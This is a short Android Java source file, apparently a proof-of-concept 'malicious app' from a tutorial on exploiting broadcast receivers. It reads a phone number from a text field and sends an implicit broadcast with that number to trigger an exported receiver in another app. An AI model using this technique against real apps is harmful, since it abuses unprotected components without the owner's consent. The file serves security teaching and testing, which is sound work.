package com.example.maliciousapp;

import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.EditText;

/**
 * POC from site: http://resources.infosecinstitute.com/android-hacking-security-part-3-exploiting-
 * broadcast-receivers/
 */
public class MainActivity extends AppCompatActivity implements OnClickListener {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		findViewById(R.id.send_broadcast).setOnClickListener(this);
	}

	@Override
	public void onClick(View view) {
		EditText editTextPhone = (EditText) findViewById(R.id.edit_text_phone);
		String phoneNumber = editTextPhone.getText().toString();
		Intent intent = new Intent();
		intent.setAction("MyBroadcast");
		intent.putExtra("number", phoneNumber);
		sendBroadcast(intent);
	}
}
